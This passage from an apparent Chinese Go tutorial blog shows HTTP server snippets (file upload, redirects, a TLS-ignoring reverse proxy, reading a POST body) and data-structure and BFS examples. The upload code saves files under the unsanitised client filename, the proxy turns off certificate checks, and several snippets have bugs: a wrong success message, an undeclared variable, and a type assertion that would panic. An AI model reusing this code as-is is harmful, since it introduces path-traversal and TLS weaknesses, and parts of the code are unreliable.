&#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;upload failed, err:&quot;</span>, err)</span><br><span class="line">		w.Write([]<span class="type">byte</span>(<span class="string">&quot;upload success&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 本地创建文件</span></span><br><span class="line">	f, err := os.Create(<span class="string">&quot;./upload_dir/&quot;</span> + handler.Filename)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 文件保存</span></span><br><span class="line">	_, err = io.Copy(f, file)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;upload success&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	http.Handle(<span class="string">&quot;/&quot;</span>, http.FileServer(http.Dir(<span class="string">&quot;template&quot;</span>)))</span><br><span class="line">	<span class="comment">// 设置接口处理文件传输</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/uploadfile&quot;</span>, uploadHandler)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:4567&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;Listen port failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-4-302跳转"><a href="#1-4-302跳转" class="headerlink" title="1.4. 302跳转"></a>1.4. 302跳转</h3><p><strong>简单跳转</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 直接跳转</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, http.RedirectHandler(<span class="string">&quot;http://1.1.1.1&quot;</span>, http.StatusFound))</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;start server: http://localhost:4567 &quot;</span>)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:4567&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;Listen port failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>特定目录跳转</strong></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 访问根转发到template</span></span><br><span class="line">	<span class="keyword">if</span> r.URL.Path == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">		http.Redirect(w, r, <span class="string">&quot;/template/&quot;</span>, http.StatusFound)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	w.Write([]<span class="type">byte</span>(r.URL.Path))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 处理其他请求</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, rootHandler)</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;start server: http://localhost:4567 &quot;</span>)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:4567&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;Listen port failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-代理转发"><a href="#1-5-代理转发" class="headerlink" title="1.5. 代理转发"></a>1.5. 代理转发</h3><ul>
<li>定义tr忽略证书错误</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http/httputil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 访问根转发到template</span></span><br><span class="line">	<span class="keyword">if</span> r.URL.Path == <span class="string">&quot;/&quot;</span> &#123;</span><br><span class="line">		http.Redirect(w, r, <span class="string">&quot;/template/&quot;</span>, http.StatusFound)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 请求转发给另一个url</span></span><br><span class="line">	remote, err := url.Parse(<span class="string">&quot;https://1.1.1.1&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(<span class="string">&quot;serverAddr is invalid&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	proxy := httputil.NewSingleHostReverseProxy(remote)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 忽略证书错误</span></span><br><span class="line">	tr := &amp;http.Transport&#123;</span><br><span class="line">		TLSClientConfig: &amp;tls.Config&#123;InsecureSkipVerify: <span class="literal">true</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	proxy.Transport = tr</span><br><span class="line"></span><br><span class="line">	proxy.ServeHTTP(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 处理其他请求</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, rootHandler)</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;start server: http://localhost:4567 &quot;</span>)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:4567&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;Listen port failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-处理post的body数据"><a href="#1-4-处理post的body数据" class="headerlink" title="1.4. 处理post的body数据"></a>1.4. 处理post的body数据</h3><ul>
<li>json数据存在body里面<br><strong><font color="red"><code>r.Body</code>只能读取一次，读完就会关闭，需要再次读取需要加上下面注释说明的代码</font></strong></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/tls&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http/httputil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/url&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rootHandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> body []<span class="type">byte</span></span><br><span class="line">	<span class="keyword">if</span> r.Body != <span class="literal">nil</span> &#123;</span><br><span class="line">		body, err = ioutil.ReadAll(r.Body)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 如果body想要多次读取需要加上下面的语句，重新申请一个readerCloser</span></span><br><span class="line">	r.Body = ioutil.NopCloser(bytes.NewReader(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 处理其他请求</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, rootHandler)</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;start server: http://localhost:4567 &quot;</span>)</span><br><span class="line">	err := http.ListenAndServe(<span class="string">&quot;:4567&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;Listen port failed, err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="八、算法和数据结构的实现"><a href="#八、算法和数据结构的实现" class="headerlink" title="八、算法和数据结构的实现"></a>八、算法和数据结构的实现</h1><h2 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1. 数据结构"></a>1. 数据结构</h2><h3 id="1-1-队列"><a href="#1-1-队列" class="headerlink" title="1.1. 队列"></a>1.1. 队列</h3><ul>
<li>可以使用<code>list.List</code>进行实现</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> test list.List</span><br><span class="line">	<span class="comment">// 入队列</span></span><br><span class="line">	test.PushBack(<span class="number">1</span>)</span><br><span class="line">	test.PushBack(<span class="number">2</span>)</span><br><span class="line">	<span class="comment">// 出队列</span></span><br><span class="line">	value := test.Front().Value</span><br><span class="line">	test.Remove(test.Front())</span><br><span class="line">	fmt.Println(value)</span><br><span class="line">	<span class="comment">// 长度</span></span><br><span class="line">	fmt.Println(test.Len())</span><br><span class="line">	<span class="comment">// 遍历</span></span><br><span class="line">	<span class="keyword">for</span> iter := test.Front(); iter != <span class="literal">nil</span>; iter = iter.Next() &#123;</span><br><span class="line">		fmt.Println(iter.Value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-栈"><a href="#1-2-栈" class="headerlink" title="1.2. 栈"></a>1.2. 栈</h3><h4 id="1-list-List实现"><a href="#1-list-List实现" class="headerlink" title="1) list.List实现"></a>1) list.List实现</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> test list.List</span><br><span class="line">	<span class="comment">// 入栈</span></span><br><span class="line">	test.PushFront(<span class="number">1</span>)</span><br><span class="line">	test.PushFront(<span class="number">2</span>)</span><br><span class="line">	test.PushFront(<span class="number">3</span>)</span><br><span class="line">	<span class="comment">// 出栈</span></span><br><span class="line">	value := test.Front().Value</span><br><span class="line">	test.Remove(test.Front())</span><br><span class="line">	fmt.Println(value)</span><br><span class="line">	<span class="comment">// 长度</span></span><br><span class="line">	fmt.Println(test.Len())</span><br><span class="line">	<span class="comment">// 从栈顶遍历</span></span><br><span class="line">	<span class="keyword">for</span> iter := test.Front(); iter != <span class="literal">nil</span>; iter = iter.Next() &#123;</span><br><span class="line">		fmt.Println(iter.Value)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-slice实现"><a href="#2-slice实现" class="headerlink" title="2) slice实现"></a>2) slice实现</h4><ul>
<li>slice实现有个好处就是，入栈会动态扩容，出栈容量会保留</li>
<li>slice实现队列会导致重复内存申请</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	test := []<span class="type">int</span>&#123;&#125;</span><br><span class="line">	<span class="comment">// 入栈</span></span><br><span class="line">	test = <span class="built_in">append</span>(test, <span class="number">1</span>)</span><br><span class="line">	test = <span class="built_in">append</span>(test, <span class="number">2</span>)</span><br><span class="line">	test = <span class="built_in">append</span>(test, <span class="number">3</span>)</span><br><span class="line">	<span class="comment">// 出栈</span></span><br><span class="line">	value := test[<span class="built_in">len</span>(test)<span class="number">-1</span>]</span><br><span class="line">	test = test[:<span class="built_in">len</span>(test)<span class="number">-1</span>]</span><br><span class="line">	fmt.Println(value)</span><br><span class="line">	<span class="comment">// 长度</span></span><br><span class="line">	fmt.Println(<span class="built_in">len</span>(test))</span><br><span class="line">	<span class="comment">// 从栈顶遍历</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="built_in">len</span>(test); i &gt; <span class="number">0</span>; i-- &#123;</span><br><span class="line">		fmt.Println(test[i<span class="number">-1</span>])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-链表"><a href="#1-3-链表" class="headerlink" title="1.3. 链表"></a>1.3. 链表</h3><ul>
<li>直接使用<code>list.List</code>就好，单向双向都支持</li>
</ul>
<h3 id="1-4-大（小）根堆"><a href="#1-4-大（小）根堆" class="headerlink" title="1.4. 大（小）根堆"></a>1.4. 大（小）根堆</h3><ul>
<li>官方库有heap，可以进行此操作，但是需要自己实现几个接口</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> bhp <span class="keyword">struct</span>&#123; sort.IntSlice &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *bhp)</span></span> Less(i, j <span class="type">int</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> l.IntSlice.Less(j, i)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *bhp)</span></span> Push(x <span class="keyword">interface</span>&#123;&#125;) &#123;</span><br><span class="line">	l.IntSlice = <span class="built_in">append</span>(l.IntSlice, x.(<span class="type">int</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(l *bhp)</span></span> Pop() <span class="keyword">interface</span>&#123;&#125; &#123;</span><br><span class="line">	n := <span class="built_in">len</span>(l.IntSlice)</span><br><span class="line">	x := l.IntSlice[n<span class="number">-1</span>]</span><br><span class="line">	l.IntSlice = l.IntSlice[:n<span class="number">-1</span>]</span><br><span class="line">	<span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	unorderList := []<span class="type">int</span>&#123;<span class="number">12</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">23</span>, <span class="number">45</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>&#125;</span><br><span class="line">	fmt.Println(unorderList)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化大根堆</span></span><br><span class="line">	b := bhp&#123;unorderList&#125;</span><br><span class="line">	heap.Init(&amp;b)</span><br><span class="line">	<span class="comment">// 堆排序，按照顺序一直将栈顶弹出，就为从大到小排序</span></span><br><span class="line">	<span class="keyword">for</span> b.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(heap.Pop(&amp;b))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-二叉树"><a href="#1-5-二叉树" class="headerlink" title="1.5. 二叉树"></a>1.5. 二叉树</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	value <span class="type">int</span></span><br><span class="line">	left *TreeNode</span><br><span class="line">	right *TreeNode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-算法"><a href="#2-算法" class="headerlink" title="2. 算法"></a>2. 算法</h2><h3 id="2-1-全排列"><a href="#2-1-全排列" class="headerlink" title="2.1. 全排列"></a>2.1. 全排列</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">permutation</span><span class="params">(str []<span class="type">byte</span>, index <span class="type">int</span>, f <span class="keyword">func</span>(str []<span class="type">byte</span>)</span></span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(str) == index &#123;</span><br><span class="line">		f(str)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 不交换的场景</span></span><br><span class="line">	permutation(str, index+<span class="number">1</span>, f)</span><br><span class="line">	<span class="comment">// index对应位置向后交换</span></span><br><span class="line">	<span class="keyword">for</span> i := index + <span class="number">1</span>; i &lt; <span class="built_in">len</span>(str); i++ &#123;</span><br><span class="line">		str[i], str[index] = str[index], str[i]</span><br><span class="line">		permutation(str, index+<span class="number">1</span>, f)</span><br><span class="line">		str[i], str[index] = str[index], str[i]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	permutation([]<span class="type">byte</span>(<span class="string">&quot;abcd&quot;</span>), <span class="number">0</span>, <span class="function"><span class="keyword">func</span><span class="params">(str []<span class="type">byte</span>)</span></span> &#123;</span><br><span class="line">		fmt.Println(<span class="type">string</span>(str))</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-bfs-广度优先算法"><a href="#2-2-bfs-广度优先算法" class="headerlink" title="2.2. bfs 广度优先算法"></a>2.2. bfs 广度优先算法</h3><h4 id="1-二叉树的广度优先遍历"><a href="#1-二叉树的广度优先遍历" class="headerlink" title="1) 二叉树的广度优先遍历"></a>1) 二叉树的广度优先遍历</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	value <span class="type">int</span></span><br><span class="line">	left  *TreeNode</span><br><span class="line">	right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bfs</span><span class="params">(root *TreeNode)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> queue list.List</span><br><span class="line">	queue.PushBack(&amp;root)</span><br><span class="line">	<span class="keyword">for</span> queue.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		node := queue.Front().Value.(*TreeNode)</span><br><span class="line">		queue.Remove(queue.Front())</span><br><span class="line">		<span class="keyword">if</span> node.left != <span class="literal">nil</span> &#123;</span><br><span class="line">			queue.PushBack(node.left)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> node.right != <span class="literal">nil</span> &#123;</span><br><span class="line">			queue.PushBack(node.right)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(node.value)	<span class="comment">// 这里取值</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-方格中找两点最短路径"><a href="#2-方格中找两点最短路径" class="headerlink" title="2) 方格中找两点最短路径"></a>2) 方格中找两点最短路径</h4><ul>
<li>两格之间步数为1，<code>#</code>作为墙不可走</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> pointT <span class="keyword">struct</span> &#123;</span><br><span class="line">	x <span class="type">int</span></span><br><span class="line">	y <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	<span class="comment">// 按照上下左右的相对位置设定，用于后面方便找四周的点</span></span><br><span class="line">	kRoundPoints = [][]<span class="type">int</span>&#123;</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">-1</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0</span>, <span class="number">1</span>&#125;,</span><br><span class="line">		&#123;<span class="number">-1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">		&#123;<span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回从src到dst的最短路径长度，带层间隔版本</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bfsFloor</span><span class="params">(src pointT, dst pointT, grid []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="comment">// 减小计算量，走过的路不再走，记录一下哪里走过了</span></span><br><span class="line">	seen := <span class="built_in">make</span>([][]<span class="type">bool</span>, <span class="built_in">len</span>(grid))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> seen &#123;</span><br><span class="line">		seen[i] = <span class="built_in">make</span>([]<span class="type">bool</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>]))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 源地址记录走过了，注意x是第二维的坐标</span></span><br><span class="line">	seen[src.y][src.x] = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 使用层数作为步数</span></span><br><span class="line">	curDepth := <span class="number">0</span></span><br><span class="line">	<span class="keyword">var</span> queue list.List</span><br><span class="line">	<span class="comment">// 插入源地址，作为第一层，使用nil作为层间隔</span></span><br><span class="line">	queue.PushBack(src)</span><br><span class="line">	queue.PushBack(<span class="literal">nil</span>)</span><br><span class="line">	<span class="comment">// 队列一定含有一个层间隔，不在头就在尾，如果只剩一个层间隔，说明没路可走</span></span><br><span class="line">	<span class="keyword">for</span> queue.Len() &gt; <span class="number">1</span> &#123;</span><br><span class="line">		tmp := queue.Front().Value</span><br><span class="line">		queue.Remove(queue.Front())</span><br><span class="line">		<span class="keyword">if</span> tmp == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="comment">// 找到层间隔，说明当前层遍历完了，步数加一准备下一层</span></span><br><span class="line">			curDepth++</span><br><span class="line">			<span class="comment">// 当前层遍历完，队列剩余的都是下一层，加入一个层间隔</span></span><br><span class="line">			queue.PushBack(<span class="literal">nil</span>)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 判断当前点是不是目标点，如果是，说明走到了，返回步数</span></span><br><span class="line">		tx, ty := tmp.(pointT).x, tmp.(pointT).y</span><br><span class="line">		<span class="keyword">if</span> tx == dst.x &amp;&amp; ty == dst.y &#123;</span><br><span class="line">			<span class="keyword">return</span> curDepth</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 不是目标点，从此点出发，向四周走一下</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> kRoundPoints &#123;</span><br><span class="line">			px, py := tx+kRoundPoints[i][<span class="number">0</span>], ty+kRoundPoints[i][<span class="number">1</span>]</span><br><span class="line">			<span class="comment">// 如果超出边界或者已经走过了或者碰到墙，就继续</span></span><br><span class="line">			<span class="keyword">if</span> py &lt; <span class="number">0</span> || py &gt;= <span class="built_in">len</span>(grid) || px &lt; <span class="number">0</span> || px &gt;= <span class="built_in">len</span>(grid[<span class="number">0</span>]) || seen[py][px] || grid[py][px] == <span class="string">&#x27;#&#x27;</span> &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 这个点可以走，走上去，记录到队列中，作为下一层的起点</span></span><br><span class="line">			seen[py][px] = <span class="literal">true</span></span><br><span class="line">			queue.PushBack(pointT&#123;px, py&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> pointST <span class="keyword">struct</span> &#123;</span><br><span class="line">	x    <span class="type">int</span></span><br><span class="line">	y    <span class="type">int</span></span><br><span class="line">	step <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回从src到dst的最短路径长度</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">bfs</span><span class="params">(src pointST, dst pointST, grid []<span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">	<span class="comment">// 减小计算量，走过的路不再走，记录一下哪里走过了</span></span><br><span class="line">	seen := <span class="built_in">make</span>([][]<span class="type">bool</span>, <span class="built_in">len</span>(grid))</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> seen &#123;</span><br><span class="line">		seen[i] = <span class="built_in">make</span>([]<span class="type">bool</span>, <span class="built_in">len</span>(grid[<span class="number">0</span>]))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 源地址记录走过了，注意x是第二维的坐标</span></span><br><span class="line">	seen[src.y][src.x] = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> queue list.List</span><br><span class="line">	<span class="comment">// 插入源地址</span></span><br><span class="line">	queue.PushBack(src)</span><br><span class="line">	<span class="keyword">for</span> queue.Len() &gt; <span class="number">0</span> &#123;</span><br><span class="line">		tmp := queue.Front().Value.(pointST)</span><br><span class="line">		queue.Remove(queue.Front())</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 判断当前点是不是目标点，如果是，说明走到了，返回步数</span></span><br><span class="line">		<span class="keyword">if</span> tmp.x == dst.x &amp;&amp; tmp.y == dst.y &#123;</span><br><span class="line">			<span class="keyword">return</span> tmp.step</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 不是目标点，从此点出发，向四周走一下</span></span><br><span class="line">		<span class="keyword">for</span> i := <span class="keyword">range</span> kRoundPoints &#123;</span><br><span class="line">			px, py := tmp.x+kRoundPoints[i][<span class="number">0</span>], tmp.y+kRoundPoints[i][<span class="number">1</span>]</span><br><span class="line">			<span class="comment">// 如果超出边界或者已经走过了或者碰到墙，就继续</span></span><br><span class="line">			<span class="keyword">if</span> py &lt; <span class="number">0</span> || py &gt;= <span class="built_in">len</span>(grid) || px &lt; <span class="number">0</span> || px &gt;= <span class="built_in">len</span>(grid[<span class="number">0</span>]) || seen[py][px] || grid[py][px] == <span class="string">&#x27;#&#x27;</span> &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 这个点可以走，走上去，记录到队列中，作为下一层的起点</span></span><br><span class="line">			seen[py][px] = <span class="literal">true</span></span><br><span class="line">			queue.PushBack(pointST&#123;px, py, tmp.step+<span class="number">1</span>&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		@ # . . *</span></span><br><span class="line"><span class="comment">		. . . # .</span></span><br><span class="line"><span class="comment">		# . . . .</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	grid := []<span class="type">string</span>&#123;<span class="string">&quot;@#..*&quot;</span>, <span class="string">&quot;...#.&quot;</span>, <span class="string">&quot;#....&quot;</span>&#125;</span><br><span class="line">	<span class="comment">// @ 到 * 的最短距离为6</span></span><br><span class="line">	fmt.Println(bfs(pointST&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, pointST&#123;<span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>&#125;, grid))</span><br><span class="line">	